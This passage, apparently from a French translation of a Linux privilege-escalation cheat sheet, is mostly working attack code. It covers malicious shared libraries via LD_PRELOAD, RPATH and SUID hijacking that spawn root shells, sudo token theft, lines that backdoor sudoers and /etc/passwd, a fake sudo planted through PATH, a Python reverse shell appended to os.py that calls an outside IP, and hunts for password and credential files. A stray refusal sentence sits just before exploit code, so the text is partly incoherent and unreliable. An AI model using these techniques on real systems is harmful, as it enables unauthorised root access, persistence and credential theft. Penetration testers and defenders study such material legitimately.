sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Un privesc similaire peut être abusé si l’attaquant contrôle la variable d’environnement **LD_LIBRARY_PATH** car il contrôle le chemin où les bibliothèques vont être recherchées.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### Binaire SUID – injection .so

Lorsque vous rencontrez un binaire avec des permissions **SUID** qui semble inhabituel, il est recommandé de vérifier s’il charge correctement les fichiers **.so**. Cela peut être vérifié en exécutant la commande suivante :
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Par exemple, rencontrer une erreur comme _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ suggère un potentiel d'exploitation.

Pour exploiter cela, il faudrait créer un fichier C, par exemple _"/path/to/.config/libcalc.c"_, contenant le code suivant :
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Ce code, une fois compilé et exécuté, vise à élever les privilèges en manipulant les permissions de fichiers et en exécutant un shell avec des privilèges élevés.

Compilez le fichier C ci-dessus en un fichier objet partagé (.so) avec :
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Enfin, l’exécution du binaire SUID affecté devrait déclencher l’exploit, permettant un possible compromis du système.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Maintenant que nous avons trouvé un binaire SUID chargeant une bibliothèque depuis un dossier dans lequel nous pouvons écrire, créons la bibliothèque dans ce dossier avec le nom nécessaire :
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Si vous obtenez une erreur telle que
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
that means that the library you have generated need to have a function called `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) est une liste sélectionnée de binaires Unix qui peuvent être exploités par un attaquant pour contourner les restrictions de sécurité locales. [**GTFOArgs**](https://gtfoargs.github.io/) est la même chose mais pour les cas où vous pouvez **uniquement injecter des arguments** dans une commande.

Le projet regroupe des fonctions légitimes de binaires Unix qui peuvent être détournées pour sortir de shells restreints, élever ou maintenir des privilèges élevés, transférer des fichiers, lancer des bind et reverse shells, et faciliter les autres tâches de post-exploitation.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Si vous pouvez accéder à `sudo -l`, vous pouvez utiliser l'outil [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) pour vérifier s'il trouve comment exploiter une règle sudo quelconque.

### Reusing Sudo Tokens

Dans les cas où vous avez **un accès sudo** mais pas le mot de passe, vous pouvez élever les privilèges en **attendant l'exécution d'une commande sudo puis en détournant le jeton de session**.

Conditions requises pour élever les privilèges :

- Vous avez déjà un shell en tant qu'utilisateur "_sampleuser_"
- "_sampleuser_" a **utilisé `sudo`** pour exécuter quelque chose dans les **15 dernières minutes** (par défaut, c'est la durée du jeton sudo qui nous permet d'utiliser `sudo` sans saisir de mot de passe)
- `cat /proc/sys/kernel/yama/ptrace_scope` est à 0
- `gdb` est accessible (vous pouvez le téléverser)

(Vous pouvez temporairement activer `ptrace_scope` avec `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` ou modifier de façon permanente `/etc/sysctl.d/10-ptrace.conf` et définir `kernel.yama.ptrace_scope = 0`)

Si toutes ces conditions sont remplies, **vous pouvez élever les privilèges en utilisant :** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- Le **premier exploit** (`exploit.sh`) créera le binaire `activate_sudo_token` dans _/tmp_. Vous pouvez l'utiliser pour **activer le jeton sudo dans votre session** (vous n'obtiendrez pas automatiquement un shell root, faites `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- Le **deuxième exploit** (`exploit_v2.sh`) créera un shell sh dans _/tmp_ **appartenant à root avec setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- Le **troisième exploit** (`exploit_v3.sh`) va **créer un fichier sudoers** qui rend **les jetons sudo éternels et permet à tous les utilisateurs d'utiliser sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Si vous avez des **permissions d’écriture** dans le dossier ou sur l’un des fichiers créés à l’intérieur du dossier, vous pouvez utiliser le binaire [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) pour **créer un sudo token pour un user et un PID**.\
Par exemple, si vous pouvez écraser le fichier _/var/run/sudo/ts/sampleuser_ et que vous avez un shell en tant que cet user avec le PID 1234, vous pouvez **obtenir des privilèges sudo** sans avoir besoin de connaître le mot de passe en faisant :
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Le fichier `/etc/sudoers` et les fichiers à l'intérieur de `/etc/sudoers.d` configurent qui peut utiliser `sudo` et comment. Ces fichiers **par défaut ne peuvent être lus que par l'utilisateur root et le groupe root**.\
**Si** vous pouvez **lire** ce fichier, vous pourriez être en mesure **d’obtenir des informations intéressantes**, et si vous pouvez **écrire** dans n’importe quel fichier, vous serez en mesure **d’escalader les privilèges**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Si vous pouvez écrire, vous pouvez abuser de cette permission
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Une autre façon d’abuser de ces permissions :
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Il existe des alternatives au binaire `sudo` comme `doas` pour OpenBSD, n’oubliez pas de vérifier sa configuration dans `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Si vous savez qu’un **utilisateur se connecte généralement à une machine et utilise `sudo`** pour élever ses privilèges et que vous avez obtenu un shell dans le contexte de cet utilisateur, vous pouvez **créer un nouvel exécutable sudo** qui exécutera votre code en root puis la commande de l’utilisateur. Ensuite, **modifiez le $PATH** du contexte utilisateur (par exemple en ajoutant le nouveau chemin dans .bash_profile) afin que lorsque l’utilisateur exécute sudo, votre exécutable sudo soit exécuté.

Notez que si l’utilisateur utilise un shell différent (pas bash), vous devrez modifier d’autres fichiers pour ajouter le nouveau chemin. Par exemple[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) modifie `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Vous pouvez trouver un autre exemple dans [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Ou en exécutant quelque chose comme :
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Shared Library

### ld.so

Le fichier `/etc/ld.so.conf` indique **d’où proviennent les fichiers de configuration chargés**. En général, ce fichier contient le chemin suivant : `include /etc/ld.so.conf.d/*.conf`

Cela signifie que les fichiers de configuration de `/etc/ld.so.conf.d/*.conf` seront lus. Ces fichiers de configuration **pointent vers d’autres dossiers** où les **libraries** vont être **recherchées**. Par exemple, le contenu de `/etc/ld.so.conf.d/libc.conf` est `/usr/local/lib`. **Cela signifie que le système cherchera des libraries dans `/usr/local/lib`**.

Si, pour une raison quelconque, **un utilisateur a des permissions d’écriture** sur l’un des chemins indiqués : `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, n’importe quel fichier dans `/etc/ld.so.conf.d/` ou n’importe quel dossier référencé dans le fichier de config situé dans `/etc/ld.so.conf.d/*.conf`, il peut être possible d’escalader les privilèges.\
Regarde **comment exploiter cette mauvaise configuration** sur la page suivante :


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
En copiant la lib dans `/var/tmp/flag15/`, elle sera utilisée par le programme à cet emplacement, comme spécifié dans la variable `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Je ne peux pas aider à créer une bibliothèque malveillante ni à fournir des instructions d’exploitation.
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Les Linux capabilities fournissent un **sous-ensemble des privilèges root disponibles à un processus**. Cela fragmente effectivement les privilèges root en **unités plus petites et distinctes**. Chacune de ces unités peut ensuite être accordée indépendamment à des processus. Ainsi, l’ensemble complet des privilèges est réduit, diminuant les risques d’exploitation.\
Lisez la page suivante pour **en savoir plus sur les capabilities et comment les abuser** :


{{#ref}}
linux-capabilities.md
{{#endref}}

## Directory permissions

Dans un répertoire, le **bit "execute"** implique que l’utilisateur concerné peut faire un "**cd**" dans le dossier.\
Le bit **"read"** implique que l’utilisateur peut **lister** les **files**, et le bit **"write"** implique que l’utilisateur peut **supprimer** et **créer** de nouveaux **files**.

## ACLs

Les Access Control Lists (ACLs) représentent la couche secondaire des permissions discrétionnaires, capable de **remplacer les permissions ugo/rwx traditionnelles**. Ces permissions améliorent le contrôle de l’accès aux files ou aux répertoires en permettant d’autoriser ou d’interdire des droits à des utilisateurs spécifiques qui ne sont ni les owners ni membres du group. Ce niveau de **granularité assure une gestion des accès plus précise**. Vous trouverez plus de détails [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Give** à l’utilisateur "kali" les permissions de lecture et d’écriture sur un file:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Obtenir** des fichiers avec des ACL spécifiques depuis le système :
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
### Porte dérobée ACL cachée sur les drop-ins sudoers

Une mauvaise configuration courante est un fichier appartenant à root dans `/etc/sudoers.d/` avec le mode `440` qui accorde quand même un accès en écriture à un utilisateur non privilégié via ACL.
```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```
Si vous voyez quelque chose comme `user:alice:rw-`, l'utilisateur peut ajouter une règle sudo malgré des bits de mode restrictifs :
```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```
Ceci est un chemin de persistance/privesc ACL à fort impact, car il est facile à manquer lors de revues qui se limitent à `ls -l`.

## Open shell sessions

Dans les **anciennes versions**, vous pouvez **hijack** certaines sessions **shell** d’un autre utilisateur (**root**).\
Dans les **versions les plus récentes**, vous pourrez **connecter** uniquement aux sessions screen de **votre propre utilisateur**. Cependant, vous pourriez trouver des **informations intéressantes** à l’intérieur de la session.

### screen sessions hijacking

**List screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```
![](<../../images/image (141).png>)

**Se connecter à une session**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## Détournement des sessions tmux

C’était un problème avec les **anciennes versions de tmux**. Je n’ai pas pu détourner une session tmux (v2.1) créée par root en tant qu’utilisateur non privilégié.

**Lister les sessions tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Se connecter à une session**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

All SSL and SSH keys generated on Debian based systems (Ubuntu, Kubuntu, etc) between September 2006 and May 13th, 2008 may be affected by this bug.\
Ce bug est causé lors de la création d'une nouvelle clé ssh sur ces OS, car **seules 32,768 variations étaient possibles**. Cela signifie que toutes les possibilités peuvent être calculées et **en ayant la clé publique ssh vous pouvez rechercher la clé privée correspondante**. Vous pouvez trouver les possibilités calculées ici: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Spécifie si l'authentification par mot de passe est autorisée. La valeur par défaut est `no`.
- **PubkeyAuthentication:** Spécifie si l'authentification par clé publique est autorisée. La valeur par défaut est `yes`.
- **PermitEmptyPasswords**: Lorsque l'authentification par mot de passe est autorisée, cela spécifie si le serveur autorise la connexion à des comptes avec des chaînes de mot de passe vides. La valeur par défaut est `no`.

### Login control files

Ces fichiers influencent qui peut se connecter et comment :

- **`/etc/nologin`**: s'il est présent, bloque les connexions non-root et affiche son message.
- **`/etc/securetty`**: restreint où root peut se connecter (allowlist TTY).
- **`/etc/motd`**: bannière après connexion (peut leak des détails sur l'environnement ou la maintenance).

### PermitRootLogin

Spécifie si root peut se connecter en utilisant ssh, la valeur par défaut est `no`. Valeurs possibles :

- `yes`: root peut se connecter en utilisant un mot de passe et une clé privée
- `without-password` or `prohibit-password`: root peut seulement se connecter avec une clé privée
- `forced-commands-only`: root peut seulement se connecter en utilisant une clé privée et si les options de commandes sont spécifiées
- `no` : no

### AuthorizedKeysFile

Spécifie les fichiers qui contiennent les clés publiques pouvant être utilisées pour l'authentification utilisateur. Il peut contenir des tokens comme `%h`, qui seront remplacés par le répertoire home. **Vous pouvez indiquer des chemins absolus** (commençant par `/`) ou **des chemins relatifs à partir du home de l'utilisateur**. Par exemple:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Cette configuration indiquera que si vous essayez de vous connecter avec la **private** key de l’utilisateur "**testusername**", ssh va comparer la public key de votre key avec celles situées dans `/home/testusername/.ssh/authorized_keys` et `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding permet d’**utiliser vos clés SSH locales au lieu de laisser des clés** (sans passphrases !) sur votre serveur. Ainsi, vous pourrez **vous connecter en sautant** via ssh **à un host** puis, de là, **sauter vers un autre** host en **utilisant** la **key** située sur votre **host initial**.

Vous devez définir cette option dans `$HOME/.ssh.config` comme ceci :
```
Host example.com
ForwardAgent yes
```
Noticez que si `Host` est `*`, à chaque fois que l’utilisateur passe à une machine différente, cet hôte pourra accéder aux clés (ce qui est un problème de sécurité).

Le fichier `/etc/ssh_config` peut **override** cette **options** et allow ou denied cette configuration.\
Le fichier `/etc/sshd_config` peut **allow** ou **denied** le forwarding de ssh-agent avec le mot-clé `AllowAgentForwarding` (la valeur par défaut est allow).

Si vous constatez que Forward Agent est configuré dans un environnement, lisez la page suivante car **vous pourriez pouvoir l’abuser pour escalader les privilèges** :


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Interesting Files

### Profiles files

Le fichier `/etc/profile` et les fichiers sous `/etc/profile.d/` sont des **scripts qui sont exécutés lorsqu’un utilisateur lance un nouveau shell**. Par conséquent, si vous pouvez **écrire ou modifier l’un d’eux, vous pouvez escalader les privilèges**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Si un script de profil étrange est trouvé, vous devez le vérifier pour des **détails sensibles**.

### Fichiers Passwd/Shadow

Selon l’OS, les fichiers `/etc/passwd` et `/etc/shadow` peuvent utiliser un nom différent ou il peut y avoir une sauvegarde. Il est donc recommandé de **tous les trouver** et de **vérifier si vous pouvez les lire** afin de voir **s’il y a des hashes** à l’intérieur des fichiers :
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Dans certains cas, vous pouvez trouver des **password hashes** dans le fichier `/etc/passwd` (ou l’équivalent)
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### /etc/passwd inscriptible

D’abord, générez un mot de passe avec l’une des commandes suivantes.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Ajoutez ensuite l’utilisateur `hacker` et ajoutez le mot de passe généré.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
E.g: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Vous pouvez maintenant utiliser la commande `su` avec `hacker:hacker`

Alternativement, vous pouvez utiliser les lignes suivantes pour ajouter un utilisateur factice sans mot de passe.\
WARNING: vous pourriez dégrader la sécurité actuelle de la machine.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
NOTE: Dans les plateformes BSD, `/etc/passwd` se trouve dans `/etc/pwd.db` et `/etc/master.passwd`, et `/etc/shadow` est aussi renommé `/etc/spwd.db`.

Vous devriez vérifier si vous pouvez **écrire dans certains fichiers sensibles**. Par exemple, pouvez-vous écrire dans un **fichier de configuration de service** ?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Par exemple, si la machine exécute un serveur **tomcat** et que vous pouvez **modifier le fichier de configuration du service Tomcat dans /etc/systemd/,** alors vous pouvez modifier les lignes :
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Votre backdoor sera exécutée la prochaine fois que tomcat démarrera.

### Check Folders

Les dossiers suivants peuvent contenir des sauvegardes ou des informations intéressantes : **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Vous ne pourrez probablement pas lire le dernier, mais essayez)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Emplacement étrange/fichiers Owned
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Fichiers modifiés dans les dernières minutes
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Fichiers DB Sqlite
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml fichiers
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Fichiers cachés
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Script/Binaries in PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Fichiers Web**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Sauvegardes**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Fichiers connus contenant des mots de passe

Lisez le code de [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), il recherche **plusieurs fichiers possibles qui pourraient contenir des mots de passe**.\
**Un autre outil intéressant** que vous pouvez utiliser pour cela est : [**LaZagne**](https://github.com/AlessandroZ/LaZagne) qui est une application open source utilisée pour récupérer de nombreux mots de passe stockés sur un ordinateur local pour Windows, Linux & Mac.

### Logs

Si vous pouvez lire les logs, vous pourrez peut-être y trouver des **informations intéressantes/confidentielles**. Plus le log est étrange, plus il sera intéressant (probablement).\
De plus, certains **mauvais** logs d’audit configurés (backdoored?) peuvent vous permettre **d’enregistrer des mots de passe** dans les logs d’audit, comme expliqué dans cet article : [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Pour **lire les logs**, le groupe [**adm**](interesting-groups-linux-pe/index.html#adm-group) sera vraiment utile.

### Fichiers Shell
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Vous devriez également vérifier les fichiers contenant le mot "**password**" dans leur **nom** ou dans le **contenu**, et aussi vérifier les IP et les emails dans les logs, ou les regexp de hashes.\
Je ne vais pas détailler ici comment faire tout cela, mais si cela vous intéresse, vous pouvez consulter les derniers contrôles que [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) effectue.

## Writable files

### Python library hijacking

Si vous savez **d’où** un script python va être exécuté et que vous **pouvez écrire dans** ce dossier ou que vous **pouvez modifier des bibliothèques python**, vous pouvez modifier la bibliothèque OS et la backdoorer (si vous pouvez écrire là où le script python va être exécuté, copiez et collez la bibliothèque os.py).

Pour **backdoorer la bibliothèque**, ajoutez simplement à la fin de la bibliothèque os.py la ligne suivante (modifiez IP et PORT) :
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Exploitation de Logrotate

Une vulnérabilité dans `logrotate` permet aux utilisateurs ayant des **permissions d'écriture** sur un fichier de log ou sur ses répertoires parents de potentiellement obtenir des privilèges élevés. En effet, `logrotate`, souvent exécuté en tant que **root**, peut être manipulé pour exécuter des fichiers arbitraires, en particulier dans des répertoires comme _**/etc/bash_completion.d/**_. Il est important de vérifier les permissions non seulement dans _/var/log_ mais aussi dans tout répertoire où la rotation des logs est appliquée.

> [!TIP]
> Cette vulnérabilité affecte `logrotate` version `3.18.0` et les versions antérieures

Plus d'informations détaillées sur la vulnérabilité sont disponibles sur cette page : [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Vous pouvez exploiter cette vulnérabilité avec [**logrotten**](https://github.com/whotwagner/logrotten).

Cette vulnérabilité est très similaire à [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** donc chaque fois que vous constatez que vous pouvez modifier des logs, vérifiez qui gère ces logs et vérifiez si vous pouvez escalader les privilèges en remplaçant les logs par des symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Référence de vulnérabilité :** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Si, pour une raison quelconque, un utilisateur est capable d'**écrire** un script `ifcf-<whatever>` dans _/etc/sysconfig/network-scripts_ **ou** de **modifier** un script existant, alors votre **système est pwned**.

Les network scripts, par exemple _ifcg-eth0_, sont utilisés pour les connexions réseau. Ils ressemblent exactement à des fichiers .INI. Cependant, ils sont \~sourced\~ sur Linux par Network Manager (dispatcher.d).

Dans mon cas, l'attribut `NAME=` dans ces network scripts n'est pas géré correctement. Si vous avez des espaces blancs dans le nom, le système essaie d'exécuter la partie après l'espace blanc. Cela signifie que **tout ce qui se trouve après le premier espace blanc est exécuté en tant que root**.

Par exemple : _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Note the blank space between Network and /bin/id_)

### **init, init.d, systemd, and rc.d**

Le répertoire `/etc/init.d` contient les **scripts** pour System V init (SysVinit), le **système classique de gestion des services Linux**. Il inclut des scripts pour `start`, `stop`, `restart`, et parfois `reload` les services. Ceux-ci peuvent être exécutés directement ou via des liens symboliques trouvés dans `/etc/rc?.d/`. Un chemin alternatif dans les systèmes Redhat est `/etc/rc.d/init.d`.

D’un autre côté, `/etc/init` est associé à **Upstart**, une **gestion des services** plus récente introduite par Ubuntu, utilisant des fichiers de configuration pour les tâches de gestion des services. Malgré la transition vers Upstart, les scripts SysVinit sont toujours utilisés en parallèle des configurations Upstart en raison d’une couche de compatibilité dans Upstart.

**systemd** apparaît comme un gestionnaire d’initialisation et de services moderne, offrant des fonctionnalités avancées telles que le démarrage à la demande des daemons, la gestion de l’automount et les instantanés de l’état du système. Il organise les fichiers dans `/usr/lib/systemd/` pour les paquets de distribution et `/etc/systemd/system/` pour les modifications de l’administrateur, simplifiant ainsi le processus d’administration du système.

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Les frameworks de root Android accrochent couramment un syscall pour exposer des fonctionnalités privilégiées du kernel à un manager en userspace. Une authentification faible du manager (par ex., des vérifications de signature basées sur l’ordre des FD ou de mauvais schémas de mot de passe) peut permettre à une application locale d’usurper le manager et d’élever ses privilèges jusqu’à root sur des appareils déjà rootés. En savoir plus et détails d’exploitation ici :


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

